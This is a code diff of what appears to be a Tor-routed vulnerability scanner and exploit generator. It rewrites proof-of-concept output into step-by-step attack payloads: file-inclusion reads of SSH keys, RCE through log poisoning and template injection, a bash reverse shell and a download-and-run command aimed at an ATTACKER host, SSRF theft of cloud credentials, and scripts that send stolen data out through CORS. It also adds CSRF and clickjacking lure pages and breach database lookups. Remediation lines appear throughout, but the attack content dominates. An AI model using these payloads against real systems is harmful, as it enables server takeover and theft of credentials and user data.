+            poc["description"] = f"Stored XSS: payload injected at {path}, executes at {render} for every visitor."
+            poc["impact"] = "Persistent session hijacking of ALL users. Wormable (payload can re-inject itself)."
+            poc["remediation"] = "Sanitize stored input. HTML-encode on output. Use CSP with nonce."
 
         elif exploit_type == "lfi" and param:
-            poc["curl"] = (
-                f"curl --socks5-hostname 127.0.0.1:9050 "
-                f'"[TARGET_URL]?{param}=..%2F..%2F..%2Fetc%2Fpasswd"'
-            )
-            poc["description"] = (
-                f"Local file inclusion via '{param}'. "
-                f"Arbitrary server files readable."
-            )
-            poc["remediation"] = "Whitelist allowed file paths. Never pass user input to file operations."
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Read /etc/passwd:",
+                f"curl {sp} \"{target}\"",
+                f"# 2. Read application config:",
+                f"#    Payload: {param}=../../../var/www/html/config.php",
+                f"# 3. Read source code (PHP filter):",
+                f"#    Payload: {param}=php://filter/convert.base64-encode/resource=index",
+                f"# 4. Read SSH keys:",
+                f"#    Payload: {param}=../../../home/www-data/.ssh/id_rsa",
+                f"# 5. RCE via log poisoning:",
+                f"#    a) Poison access log: curl -H \"User-Agent: <?php system($_GET['cmd']); ?>\" {target.split('?')[0]}",
+                f"#    b) Include log: {param}=/var/log/apache2/access.log&cmd=id",
+            ]
+            poc["description"] = f"Local File Inclusion via '{param}'. Arbitrary file read on server."
+            poc["impact"] = "Read credentials, source code, SSH keys. Potential RCE via log poisoning."
+            poc["remediation"] = "Whitelist allowed files. Never pass user input to file functions."
 
         elif exploit_type == "command_injection" and param:
-            poc["curl"] = (
-                f"curl --socks5-hostname 127.0.0.1:9050 "
-                f'"[TARGET_URL]?{param}=;id"'
-            )
-            poc["description"] = (
-                f"OS command injection via '{param}'. "
-                f"Arbitrary commands execute on the server."
-            )
-            poc["remediation"] = "Never pass user input to shell commands. Use safe APIs."
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Confirm execution:",
+                f"curl {sp} \"{target}\"",
+                f"# 2. Read /etc/passwd:",
+                f"#    Payload: {param}=;cat /etc/passwd",
+                f"# 3. Reverse shell (bash):",
+                f"#    Payload: {param}=;bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'",
+                f"# 4. Download + execute:",
+                f"#    Payload: {param}=;curl https://ATTACKER/shell.sh|bash",
+            ]
+            poc["description"] = f"OS command injection via '{param}'. Arbitrary command execution."
+            poc["impact"] = "Full server compromise. Reverse shell, data exfiltration, lateral movement."
+            poc["remediation"] = "Never pass user input to shell. Use language-native APIs."
 
         elif exploit_type == "ssrf" and param:
-            poc["curl"] = (
-                f"curl --socks5-hostname 127.0.0.1:9050 "
-                f'"[TARGET_URL]?{param}=http://169.254.169.254/latest/meta-data/"'
-            )
-            poc["description"] = (
-                f"SSRF via '{param}'. Server fetches attacker-controlled URLs."
-            )
-            poc["remediation"] = "Validate and whitelist allowed URL destinations."
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Read AWS credentials:",
+                f"curl {sp} \"{target.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"" if "?" in target else f"# {param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                f"# 2. Scan internal network:",
+                f"#    Payload: {param}=http://192.168.1.1/",
+                f"# 3. Access internal services:",
+                f"#    Payload: {param}=http://127.0.0.1:6379/ (Redis)",
+                f"#    Payload: {param}=http://127.0.0.1:9200/ (Elasticsearch)",
+                f"#    Payload: {param}=http://127.0.0.1:3306/ (MySQL)",
+            ]
+            poc["description"] = f"SSRF via '{param}'. Server makes requests to internal/cloud resources."
+            poc["impact"] = "Cloud credential theft (AWS/GCP/Azure). Internal network scanning. Service exploitation."
+            poc["remediation"] = "Whitelist allowed destinations. Block internal IP ranges."
+
+        elif exploit_type == "ssti" and param:
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Confirm evaluation (look for '49'):",
+                f"curl {sp} \"{target.split('?')[0]}?{param}={{{{7*7}}}}\"" if "?" in target else f"# {param}={{{{7*7}}}}",
+                f"# 2. Read /etc/passwd (Jinja2):",
+                f"#    Payload: {param}={{{{''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read()}}}}",
+                f"# 3. RCE (Jinja2):",
+                f"#    Payload: {param}={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}",
+                f"# 4. RCE (Twig):",
+                f"#    Payload: {param}={{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}",
+            ]
+            poc["description"] = f"SSTI via '{param}'. Template expressions execute server-side."
+            poc["impact"] = "Remote code execution. Full server compromise."
+            poc["remediation"] = "Never render user input in templates. Use sandboxed template engines."
+
+        elif exploit_type == "csrf":
+            poc["steps"] = [
+                f"<!-- Save as csrf_exploit.html and host it -->",
+                f"<html><body>",
+                f"<form method='POST' action='{target}' id='f'>",
+                f"  <input type='hidden' name='{param}' value='attacker_controlled_value'>",
+                f"</form>",
+                f"<script>document.getElementById('f').submit();</script>",
+                f"</body></html>",
+                f"<!-- Victim visits this page -> form auto-submits with their session -->",
+            ]
+            poc["curl"] = "\n".join(poc["steps"])
+            poc["description"] = f"CSRF: form at {path or target} has no anti-forgery token."
+            poc["impact"] = "Unauthorized actions as victim: password change, fund transfer, data modification."
+            poc["remediation"] = "Add CSRF tokens to all state-changing forms. Use SameSite cookies."
+
+        elif exploit_type == "idor" and param:
+            poc["steps"] = [
+                f"# Enumerate resources:",
+                f"for i in $(seq 1 50); do",
+                f"  echo \"=== ID $i ===\"",
+                f"  curl -s {sp} \"{target.split('?')[0]}?{param}=$i\" | head -5",
+                f"done",
+                f"# Compare responses between your ID and others",
+                f"# If different users' data is returned -> confirmed IDOR",
+            ]
+            poc["curl"] = "\n".join(poc["steps"])
+            poc["description"] = f"IDOR via '{param}'. Sequential IDs expose other users' data."
+            poc["impact"] = "Access any user's data by changing the ID. Mass data exfiltration possible."
+            poc["remediation"] = "Check authorization per-request. Use UUIDs. Implement access control."
+
+        elif exploit_type == "clickjacking":
+            poc["steps"] = [
+                f"<!-- Save as clickjack.html -->",
+                f"<html><body style='margin:0'>",
+                f"<div style='position:relative'>",
+                f"  <iframe src='{target}' style='opacity:0.0001;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2'></iframe>",
+                f"  <div style='z-index:1;padding:50px'>",
+                f"    <h1>Click here to claim your prize!</h1>",
+                f"    <button style='font-size:24px;padding:20px'>CLAIM NOW</button>",
+                f"  </div>",
+                f"</div>",
+                f"</body></html>",
+            ]
+            poc["curl"] = "\n".join(poc["steps"])
+            poc["description"] = "No frame protection. Page can be embedded in attacker iframe."
+            poc["impact"] = "Trick users into clicking hidden buttons: delete account, transfer funds, change settings."
+            poc["remediation"] = "X-Frame-Options: DENY. CSP: frame-ancestors 'none'."
+
+        elif exploit_type == "cors_misconfiguration":
+            poc["steps"] = [
+                f"<!-- Host on attacker.com to steal data -->",
+                f"<script>",
+                f"fetch('{target}', {{credentials: 'include'}})",
+                f"  .then(r => r.text())",
+                f"  .then(data => {{",
+                f"    // Send stolen data to attacker",
+                f"    fetch('https://ATTACKER/collect', {{method:'POST', body:data}})",
+                f"  }});",
+                f"</script>",
+            ]
+            poc["curl"] = f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\""
+            poc["description"] = "CORS reflects any origin. Cross-origin data theft possible."
+            poc["impact"] = "Steal authenticated API responses, user data, tokens from any origin."
+            poc["remediation"] = "Whitelist origins. Never reflect Origin. Remove Access-Control-Allow-Credentials with wildcard."
+
+        elif exploit_type == "csp_bypass":
+            poc["steps"] = [
+                f"# CSP allows unsafe-inline and/or unsafe-eval",
+                f"# Any XSS vector will bypass CSP restrictions:",
+                f"# Inline: <script>alert(document.cookie)</script>",
+                f"# Eval:   <img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
+                f"# Find any input reflection and inject - CSP won't block it",
+            ]
+            poc["curl"] = "\n".join(poc["steps"])
+            poc["description"] = ei.get("method", "CSP allows script execution bypassing protection.")
+            poc["impact"] = "XSS payloads execute despite CSP. All XSS protections ineffective."
+            poc["remediation"] = "Remove unsafe-inline/unsafe-eval. Use nonce or hash-based CSP."
+
+        elif exploit_type == "crlf" and param:
+            poc["curl"] = f'curl -v {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Inject header:",
+                f"curl -v {sp} \"{target.split('?')[0]}?{param}=%0d%0aSet-Cookie:%20session=hijacked\"" if "?" in target else f"# {param}=%0d%0aSet-Cookie:%20session=hijacked",
+                f"# 2. Inject redirect:",
+                f"#    Payload: {param}=%0d%0aLocation:%20https://evil.com",
+                f"# 3. XSS via injected header:",
+                f"#    Payload: {param}=%0d%0a%0d%0a<script>alert(1)</script>",
+            ]
+            poc["description"] = f"CRLF injection via '{param}'. Arbitrary HTTP headers injectable."
+            poc["impact"] = "Session fixation, cache poisoning, XSS via response splitting."
+            poc["remediation"] = "Strip \\r\\n from all user input used in HTTP headers."
 
         elif exploit_type == "graphql_introspection" and path:
-            poc["curl"] = (
-                f'curl --socks5-hostname 127.0.0.1:9050 '
-                f'-X POST -H "Content-Type: application/json" '
-                f'-d \'{{"query": "{{ __schema {{ types {{ name }} }} }}"}}\' '
-                f'"[TARGET_URL]{path}"'
-            )
-            poc["description"] = "GraphQL introspection enabled. Full API schema exposed."
+            poc["curl"] = f'curl {sp} -X POST -H "Content-Type: application/json" -d \'{{ "query": "{{ __schema {{ types {{ name fields {{ name type {{ name }} }} }} }} }}" }}\' "{target}"'
+            poc["steps"] = [
+                f"# 1. Full schema dump:",
+                f"curl {sp} -X POST -H \"Content-Type: application/json\" -d '{{\"query\": \"{{ __schema {{ types {{ name fields {{ name type {{ name }} }} }} }} }}\"}}' \"{target}\"",
+                f"# 2. Find sensitive types (User, Account, etc.) and query them",
+                f"# 3. Example: query all users:",
+                f"#    {{\"query\": \"{{ users {{ id email password }} }}\"}}",
+            ]
+            poc["description"] = "GraphQL introspection exposes full API schema."
+            poc["impact"] = "Full API enumeration. Query any data the schema exposes."
             poc["remediation"] = "Disable introspection in production."
 
-        elif exploit_type == "subdomain_takeover":
-            cname = ei.get("cname", "")
-            service = ei.get("service", "")
-            poc["curl"] = f"# Register unclaimed resource on {service} pointing to {cname}"
-            poc["description"] = (
-                f"CNAME points to unclaimed {service} resource. "
-                f"Attacker can claim it and serve content on the subdomain."
-            )
-            poc["remediation"] = "Remove dangling CNAME record or claim the resource."
-
-        elif exploit_type == "directory_traversal":
-            poc["curl"] = (
-                f"curl --socks5-hostname 127.0.0.1:9050 "
-                f'"[TARGET_URL]/..%2F..%2F..%2F..%2Fetc%2Fpasswd"'
-            )
-            poc["description"] = "Path traversal to read arbitrary server files."
-            poc["remediation"] = "Validate file paths. Use chroot or whitelist allowed directories."
-
         elif exploit_type == "open_redirect" and param:
-            poc["curl"] = (
-                f"curl -v --socks5-hostname 127.0.0.1:9050 "
-                f'"[TARGET_URL]?{param}=https://evil.com/"'
-            )
-            poc["description"] = (
-                f"Open redirect via '{param}'. Chain with OAuth for token theft."
-            )
-            poc["remediation"] = "Whitelist allowed redirect destinations."
-
-        elif exploit_type == "xmlrpc_abuse":
-            poc["curl"] = (
-                f'curl --socks5-hostname 127.0.0.1:9050 -X POST '
-                f'-H "Content-Type: text/xml" '
-                f'-d \'<?xml version="1.0"?><methodCall><methodName>system.listMethods'
-                f'</methodName></methodCall>\' "[TARGET_URL]/xmlrpc.php"'
-            )
-            poc["description"] = "WordPress XML-RPC is enabled. Enumerate methods, attempt brute-force."
-            poc["remediation"] = "Disable XML-RPC or restrict access via .htaccess."
+            poc["curl"] = f'curl -v {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Redirect to attacker site:",
+                f"curl -v {sp} \"{target}\"",
+                f"# 2. Chain with OAuth to steal tokens:",
+                f"#    Replace redirect_uri with the vulnerable redirect",
+                f"#    Victim clicks auth link -> gets redirected to attacker with token",
+            ]
+            poc["description"] = f"Open redirect via '{param}'. Usable for phishing and OAuth theft."
+            poc["impact"] = "Phishing (trusted domain redirects to attacker). OAuth token theft."
+            poc["remediation"] = "Whitelist allowed redirect URLs. Use relative paths only."
 
         else:
-            poc["curl"] = "# Manual verification required"
+            poc["curl"] = f"# {finding.get('title', 'Finding')}"
             poc["description"] = finding.get("detail", "")
-            poc["remediation"] = "See finding detail."
+            poc["remediation"] = "See finding detail for manual verification steps."
+            poc["steps"] = [f"# Refer to evidence: {finding.get('evidence', 'N/A')[:100]}"]
 
         return poc
 
@@ -2186,11 +4202,6 @@ class FindingChain:
     # Chain rules: if finding A exists, check for finding B
     CHAIN_RULES = [
         {
-            "trigger": lambda f: f.get("title", "").startswith("Server version"),
-            "action": "version_cve_lookup",
-            "description": "Server version disclosed → check known CVEs",
-        },
-        {
             "trigger": lambda f: "WordPress" in str(f.get("evidence", "")),
             "action": "wordpress_deep_scan",
             "description": "WordPress detected → check WP-specific endpoints",
@@ -2204,11 +4215,6 @@ class FindingChain:
             "trigger": lambda f: "GraphQL" in f.get("title", ""),
             "action": "graphql_enum",
             "description": "GraphQL found → enumerate sensitive queries",
-        },
-        {
-            "trigger": lambda f: f.get("severity") == SEV_CRITICAL and f.get("exploitable"),
-            "action": "critical_exploit_verify",
-            "description": "Critical exploitable finding → auto-verify",
         },
     ]
 
@@ -2309,12 +4315,17 @@ class FindingChain:
         findings = []
         path = gql_finding.get("exploit_info", {}).get("path", "/graphql")
         url = urljoin(base_url, path)
+        domain = urlparse(base_url).netloc
 
-        # Full introspection query to find sensitive types
+        if self._session.is_domain_blocked(domain):
+            return findings
+
         query = '{ __schema { types { name fields { name type { name } } } } }'
         try:
+            self._session._delay_for_domain(domain)
+            self._session._maybe_rotate_circuit()
             resp = self._session._session.post(
-                url, json={"query": query}, timeout=15,
+                url, json={"query": query}, timeout=REQUEST_TIMEOUT,
                 proxies=self._session._proxy, headers=_pick_profile(),
             )
             if resp and resp.status_code == 200:
@@ -2461,53 +4472,100 @@ class IntelOrchestrator:
         self._vuln_findings: List[dict] = []
         self._scan_depth = scan_depth
 
+    def _run_phase(self, phase_num: int, name: str, func, *args, **kwargs):
+        """Run a scan phase with timing, error isolation, and progress display.
+
+        If a phase crashes or hangs, it's logged and skipped — never blocks
+        the rest of the scan. Shows elapsed time so the operator knows
+        what's happening.
+        """
+        if shutdown_requested():
+            return None
+        t0 = time.time()
+        print(f"\n  [*] Phase {phase_num}: {name}...")
+        try:
+            result = func(*args, **kwargs)
+            elapsed = time.time() - t0
+            if elapsed > 30:
+                print(f"      ({elapsed:.0f}s elapsed)")
+            return result
+        except KeyboardInterrupt:
+            print(f"  [!] Phase {phase_num} interrupted by user")
+            return None
+        except Exception as e:
+            elapsed = time.time() - t0
+            print(f"  [!] Phase {phase_num} error: {type(e).__name__}: {str(e)[:60]} ({elapsed:.0f}s)")
+            integrity_log("intel", f"phase_{phase_num}_error:{type(e).__name__}")
+            return None
+
     def run_domain(self, domain: str):
-        """Full domain reconnaissance + vulnerability scan."""
+        """Full domain reconnaissance + vulnerability scan.
+
+        Each phase is isolated — one failure or hang does not block others.
+        Progress is shown inline with timing.
+        """
         print(f"\n  {'═' * 55}")
         print(f"  TARGET: {domain}")
         print(f"  DEPTH:  {self._scan_depth}")
-        print(f"  {'═' * 55}\n")
+        print(f"  {'═' * 55}")
 
+        t_start = time.time()
         base_url = f"https://{domain}"
 
         # Phase 1: Main page scrape + data extraction
-        print(f"  [*] Phase 1: Fetching main page...")
-        result = self._scraper.scrape_url(base_url)
+        def _phase1():
+            r = self._scraper.scrape_url(base_url)
+            if not r:
+                r = self._scraper.scrape_url(f"http://{domain}")
+            return r
+
+        result = self._run_phase(1, "Fetching main page", _phase1)
         if not result:
-            # Try HTTP
-            base_url = f"http://{domain}"
-            result = self._scraper.scrape_url(base_url)
-        if result and not result.get("honeypot"):
+            print(f"  [!] Could not fetch {domain} (both HTTPS and HTTP failed).")
+            print(f"  [!] The site may be down, blocking Tor, or require authentication.")
+            print(f"  [*] Continuing with header/DNS checks only...")
+        elif result.get("honeypot"):
+            print(f"  [!] Honeypot/WAF detected. Some checks may be limited.")
+        else:
             self._results.append(result)
             self._print_extraction(result)
-        elif result and result.get("honeypot"):
-            print(f"  [!] Honeypot/WAF detected. Some checks may be limited.")
+            if result.get("url", "").startswith("http://"):
+                base_url = f"http://{domain}"
 
         # Phase 2: Technology fingerprinting
-        print(f"\n  [*] Phase 2: Technology fingerprinting...")
         html = result.get("raw_html", "") if result else ""
         headers = result.get("raw_headers", {}) if result else {}
-        tech = self._tech.fingerprint(headers, html)
-        self._print_tech(tech)
+        tech = self._run_phase(2, "Technology fingerprinting",
+                               self._tech.fingerprint, headers, html) or {}
+        if tech:
+            self._print_tech(tech)
 
-        # Phase 3: Vulnerability scanning
-        print(f"\n  [*] Phase 3: Vulnerability scanning ({self._scan_depth})...")
-        vulns = self._vulns.scan_full(base_url, html, headers, depth=self._scan_depth)
+        # Phase 3: Vulnerability scanning (headers + path probes)
+        vulns = self._run_phase(3, f"Vulnerability scanning ({self._scan_depth})",
+                                self._vulns.scan_full, base_url, html, headers,
+                                self._scan_depth) or []
         self._vuln_findings.extend(vulns)
         self._print_vulns(vulns)
 
+        # Reset circuit breaker between phases.
+        # Path probing (/.git, /.env, etc.) in phase 3 generates expected 403s
+        # that fill the block counter. Without reset, deep scan crawling and
+        # endpoint testing in later phases get killed by is_domain_blocked()
+        # before they can even start — making the entire deep scan useless.
+        self._session.reset_domain_blocks(domain)
+
         # Phase 4: DNS reconnaissance (full/deep only)
         if self._scan_depth in ("full", "deep"):
-            print(f"\n  [*] Phase 4: DNS reconnaissance...")
-            dns_records = self._dns.lookup(domain)
+            dns_records = self._run_phase(4, "DNS reconnaissance",
+                                          self._dns.lookup, domain) or {}
             self._print_dns(dns_records)
             if dns_records:
                 self._results.append({"type": "dns", "domain": domain, "records": dns_records})
 
         # Phase 5: Subdomain enumeration (deep only)
         if self._scan_depth == "deep":
-            print(f"\n  [*] Phase 5: Subdomain enumeration (crt.sh)...")
-            subs = self._subdomains.enumerate(domain)
+            subs = self._run_phase(5, "Subdomain enumeration (crt.sh)",
+                                   self._subdomains.enumerate, domain) or []
             if subs:
                 print(f"  [+] Found {len(subs)} subdomains")
                 for s in subs[:20]:
@@ -2517,54 +4575,76 @@ class IntelOrchestrator:
                 self._results.append({"type": "subdomains", "domain": domain,
                                       "subdomains": subs, "count": len(subs)})
 
-                # Check for subdomain takeover on subdomains that have CNAME records
+                # Phase 5b: subdomain takeover check (limit to 10, with progress)
                 print(f"\n  [*] Phase 5b: Checking subdomains for takeover...")
+                checked = 0
                 for sub in subs[:10]:
                     if shutdown_requested():
                         break
-                    sub_dns = self._dns.lookup(sub)
-                    cnames = sub_dns.get("CNAME", [])
-                    if cnames:
-                        takeover = self._vulns._check_subdomain_takeover(sub, cnames)
-                        if takeover:
-                            # Add confidence (bypasses scan_full)
-                            self._vulns._add_confidence(takeover, 0.85)
-                            self._vuln_findings.extend(takeover)
-                            for t in takeover:
-                                print(f"  [!] TAKEOVER: {t['title']}")
+                    checked += 1
+                    try:
+                        sub_dns = self._dns.lookup(sub)
+                        cnames = sub_dns.get("CNAME", [])
+                        if cnames:
+                            takeover = self._vulns._check_subdomain_takeover(sub, cnames)
+                            if takeover:
+                                self._vulns._add_confidence(takeover, 0.85)
+                                self._vuln_findings.extend(takeover)
+                                for t in takeover:
+                                    print(f"  [!] TAKEOVER: {t['title']}")
+                    except Exception as e:
+                        integrity_log("intel", f"takeover_check_error:{sub}:{type(e).__name__}")
+                print(f"      checked {checked}/{min(len(subs), 10)} subdomains")
 
-        # Phase 6: Search for additional intel
-        print(f"\n  [*] Phase 6: Search engine OSINT...")
-        dork_queries = [f'site:{domain}', f'"{domain}" filetype:pdf']
-        for dq in dork_queries[:2]:
-            if shutdown_requested():
-                break
-            self._run_search(dq, max_results=10)
+        # Phase 6: Search engine OSINT (limit scraping to avoid hanging)
+        def _phase6():
+            dork_queries = [f'site:{domain}', f'"{domain}" filetype:pdf']
+            for dq in dork_queries[:2]:
+                if shutdown_requested():
+                    break
+                self._run_search(dq, max_results=5)
+
+        self._run_phase(6, "Search engine OSINT", _phase6)
 
         # Phase 7: Finding chaining (use discoveries to find more)
         if self._scan_depth in ("full", "deep") and self._vuln_findings:
-            print(f"\n  [*] Phase 7: Finding chain analysis...")
-            chain_findings = self._chain.process_chains(
-                self._vuln_findings, base_url, tech)
+            chain_findings = self._run_phase(
+                7, "Finding chain analysis",
+                self._chain.process_chains, self._vuln_findings, base_url, tech) or []
             if chain_findings:
                 self._vulns._add_confidence(chain_findings, 0.8)
                 self._vuln_findings.extend(chain_findings)
                 print(f"  [+] Chain analysis found {len(chain_findings)} additional findings")
                 self._print_vulns(chain_findings)
 
-        # Phase 8: Verify exploitable findings (deep only)
+        # Phase 8: Verify exploitable findings (deep only, max 5 to avoid hanging)
         if self._scan_depth == "deep":
             exploitable = [f for f in self._vuln_findings if f.get("exploitable")]
             if exploitable:
-                print(f"\n  [*] Phase 8: Verifying {len(exploitable)} exploitable findings...")
-                for ef in exploitable:
+                verify_limit = min(len(exploitable), 5)
+                print(f"\n  [*] Phase 8: Verifying {verify_limit}/{len(exploitable)} exploitable findings...")
+                for idx, ef in enumerate(exploitable[:verify_limit]):
                     if shutdown_requested():
                         break
-                    self._verifier.verify_finding(ef)
-                    status = ef.get("verified", "?")
-                    conf = ef.get("confidence", 0)
-                    tag = "✓" if status == "confirmed" else "✗" if "not_reproduced" in status else "?"
-                    print(f"      {tag} {ef['title'][:50]} → {status} ({conf*100:.0f}%)")
+                    try:
+                        self._verifier.verify_finding(ef)
+                        status = ef.get("verified", "?")
+                        conf = ef.get("confidence", 0)
+                        tag = "+" if status == "confirmed" else "-" if "not_reproduced" in status else "?"
+                        print(f"      [{tag}] {ef['title'][:50]} -> {status} ({conf*100:.0f}%)")
+                    except Exception as e:
+                        print(f"      [?] {ef['title'][:50]} -> error ({type(e).__name__})")
+                        integrity_log("intel", f"verify_error:{type(e).__name__}")
+
+        # Final stats
+        elapsed_total = time.time() - t_start
+        print(f"\n  [*] Scan complete ({elapsed_total:.0f}s total)")
+        stats = self._session.get_stats()
+        if stats["total_blocks"] or stats["total_timeouts"]:
+            blocked = f"{stats['total_blocks']} blocked" if stats["total_blocks"] else ""
+            timeouts = f"{stats['total_timeouts']} timeouts" if stats["total_timeouts"] else ""
+            sep = ", " if blocked and timeouts else ""
+            print(f"  [*] Network issues: {blocked}{sep}{timeouts}")
 
     def run_email(self, email: str):
         """Breach database check for email."""
@@ -2586,7 +4666,10 @@ class IntelOrchestrator:
                 print(f"  [!] Dehashed: BREACHED ({dehashed.get('entry_count', '?')} entries)")
             self._results.append({"type": "breach_check", "data": dehashed})
         if not hibp and not dehashed:
-            print(f"  [*] No breach DB API keys configured (set HIBP_KEY / DEHASHED_KEY)")
+            if not HIBP_API_KEY and not DEHASHED_API_KEY:
+                print(f"  [*] No breach DB API keys configured (set HIBP_KEY / DEHASHED_KEY)")
+            else:
+                print(f"  [*] Breach check returned no results (API may be rate-limited or unavailable)")
 
     def run_query(self, query: str, max_pages: int = 20):
         """Search + scrape pipeline."""
@@ -2596,11 +4679,17 @@ class IntelOrchestrator:
     def _run_search(self, query: str, max_results: int = 20):
         search_results = self._scraper.search_ddg(query, max_results)
         print(f"  [+] {len(search_results)} results")
-        for i, sr in enumerate(search_results):
+        # Only scrape first few results to avoid getting stuck on slow sites
+        scrape_limit = min(len(search_results), 5)
+        for i, sr in enumerate(search_results[:scrape_limit]):
             if shutdown_requested():
                 break
             url = sr["url"]
-            print(f"  [*] [{i+1}/{len(search_results)}] {urlparse(url).netloc}...")
+            domain = urlparse(url).netloc
+            if self._session.is_domain_blocked(domain):
+                print(f"  [*] [{i+1}/{scrape_limit}] {domain} (blocked, skipped)")
+                continue
+            print(f"  [*] [{i+1}/{scrape_limit}] {domain}...")
             result = self._scraper.scrape_url(url)
             if result:
                 self._results.append(result)
@@ -2608,6 +4697,8 @@ class IntelOrchestrator:
                 if ex:
                     for etype, evals in ex.items():
                         print(f"      {etype}: {len(evals)}")
+        if len(search_results) > scrape_limit:
+            print(f"      ({len(search_results) - scrape_limit} additional results not scraped)")
 
     def run_file(self, filepath: Path):
         """Process targets from file."""
@@ -2684,9 +4775,9 @@ class IntelOrchestrator:
             reset = "\033[0m"
             exploit_tag = " [EXPLOITABLE]" if v.get("exploitable") else ""
             conf = v.get("confidence", 0)
-            conf_tag = f" ({conf*100:.0f}%)" if conf else ""
+            conf_tag = f" ({conf*100:.0f}%)" if conf is not None else ""
             print(f"  {color}[{sev}]{reset} {v['title']}{exploit_tag}{conf_tag}")
-            if sev in (SEV_CRITICAL, SEV_HIGH):
+            if sev in (SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM):
                 print(f"         {v['detail'][:120]}")
             if v.get("exploit_info"):
                 ei = v["exploit_info"]
@@ -2770,7 +4861,7 @@ class IntelOrchestrator:
                          "MEDIUM": "\033[1;33m", "LOW": "\033[0;36m",
                          "INFO": "\033[0;90m"}.get(sev, "")
                 exploit = " [EXPLOITABLE]" if v.get("exploitable") else ""
-                conf = f" ({v.get('confidence',0)*100:.0f}%)" if v.get("confidence") else ""
+                conf = f" ({v.get('confidence',0)*100:.0f}%)" if v.get("confidence") is not None else ""
                 print(f"    {color}[{sev}]\033[0m {v.get('title','?')}{exploit}{conf}")
 
         # Show extracted data inline
@@ -2781,15 +4872,24 @@ class IntelOrchestrator:
                     # Show first few values, not just counts
                     sample = list(v)[:3]
                     more = f" (+{len(v)-3} more)" if len(v) > 3 else ""
-                    print(f"    {k}: {', '.join(str(s)[:40] for s in sample)}{more}")
+                    # Truncate to 20 chars to avoid leaking full secrets/keys to scrollback
+                    print(f"    {k}: {', '.join(str(s)[:20] + '...' if len(str(s)) > 20 else str(s) for s in sample)}{more}")
 
         # Show PoC commands inline
         if pocs:
-            print(f"\n  PoC commands ({len(pocs)}):")
-            for poc in pocs[:5]:
-                print(f"    [{poc.get('severity','?')}] {poc.get('finding','?')[:50]}")
-                if poc.get("curl"):
-                    print(f"      $ {poc['curl'][:120]}")
+            print(f"\n  Exploit PoCs ({len(pocs)}):")
+            for poc in pocs[:15]:
+                print(f"\n    [{poc.get('severity','?')}] {poc.get('finding','?')[:70]}")
+                if poc.get("impact"):
+                    print(f"    Impact: {poc['impact'][:120]}")
+                if poc.get("steps"):
+                    for step in poc["steps"][:8]:
+                        print(f"      {step}")
+                elif poc.get("curl"):
+                    for curl_line in poc["curl"].split("\n")[:5]:
+                        print(f"      {curl_line}")
+                if poc.get("remediation"):
+                    print(f"    Fix: {poc['remediation'][:120]}")
 
         print(f"  {'═' * 55}")
 
@@ -2858,7 +4958,7 @@ def _list_reports():
     for r in reports:
         size = r.stat().st_size
         age = (time.time() - r.stat().st_mtime) / 60
-        enc = "🔒" if r.suffix == ".enc" else "📄"
+        enc = "[enc]" if r.suffix == ".enc" else "[txt]"
         print(f"  {enc} {r.name}  ({size} bytes, {age:.0f}m ago)")
     print(f"  {'═' * 50}")
     print(f"  Read with: --read-report <filename>")
@@ -2948,7 +5048,7 @@ def _display_report(report: dict):
                      "MEDIUM": "\033[1;33m", "LOW": "\033[0;36m",
                      "INFO": "\033[0;90m"}.get(sev, "")
             exploit = " [EXPLOITABLE]" if v.get("exploitable") else ""
-            conf = f" ({v.get('confidence', 0)*100:.0f}%)" if v.get("confidence") else ""
+            conf = f" ({v.get('confidence', 0)*100:.0f}%)" if v.get("confidence") is not None else ""
             verified = ""
             if v.get("verified") == "confirmed":
                 verified = " ✓verified"
@@ -2967,14 +5067,20 @@ def _display_report(report: dict):
     pocs = report.get("proof_of_concepts", [])
     if pocs:
         print(f"\n  {'─' * 60}")
-        print(f"  PROOF OF CONCEPT COMMANDS ({len(pocs)})")
+        print(f"  EXPLOIT PROOF OF CONCEPTS ({len(pocs)})")
         print(f"  {'─' * 60}")
         for poc in pocs:
-            if poc.get("curl"):
-                print(f"\n  [{poc.get('severity', '?')}] {poc.get('finding', '?')}")
-                print(f"    $ {poc['curl']}")
-                if poc.get("remediation"):
-                    print(f"    Fix: {poc['remediation']}")
+            print(f"\n  [{poc.get('severity', '?')}] {poc.get('finding', '?')}")
+            if poc.get("impact"):
+                print(f"  Impact: {poc['impact'][:150]}")
+            if poc.get("steps"):
+                for step in poc["steps"]:
+                    print(f"    {step}")
+            elif poc.get("curl"):
+                for line in poc["curl"].split("\n"):
+                    print(f"    {line}")
+            if poc.get("remediation"):
+                print(f"  Fix: {poc['remediation']}")
 
     print(f"\n  {'═' * 60}\n")
 
@@ -2995,6 +5101,10 @@ def main():
                     help="Tor SOCKS5 proxy (default: socks5h://127.0.0.1:9050)")
     ap.add_argument("--max-results", type=int, default=20,
                     help="Max search results per query (default: 20)")
+    ap.add_argument("--cookie", action="append", default=[],
+                    help="Session cookie (name=value). Repeat for multiple. "
+                         "Enables scanning authenticated pages. "
+                         "Example: --cookie PHPSESSID=abc123 --cookie security=low")
     ap.add_argument("--wipe", action="store_true", help="Wipe all intel data and exit")
     ap.add_argument("--read-report", type=Path, metavar="FILE",
                     help="Read and display an existing report (encrypted or plain)")
@@ -3042,9 +5152,25 @@ def main():
         sys.exit(1)
 
     proxy = require_tor_proxy(args.tor_proxy)
+
+    global _ACTIVE_TOR_PORT
+    _proxy_parsed = urlparse(args.tor_proxy)
+    _ACTIVE_TOR_PORT = str(_proxy_parsed.port or 9050)
+
     integrity_log("intel", "session_start")
 
     orch = IntelOrchestrator(proxy, scan_depth=args.scan)
+
+    # Set session cookies for authenticated scanning
+    if args.cookie:
